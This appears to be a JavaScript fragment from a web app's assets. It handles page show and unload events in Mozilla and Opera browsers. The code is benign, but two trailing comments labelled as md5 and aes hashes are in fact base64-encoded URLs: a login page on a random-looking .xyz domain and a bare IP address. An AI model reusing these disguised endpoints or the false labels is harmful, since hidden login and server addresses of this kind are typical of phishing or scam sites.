if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cuZmN4c2Vkc25mZnZiZGV2MS54eXovd2FwLyMvbG9naW4=**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/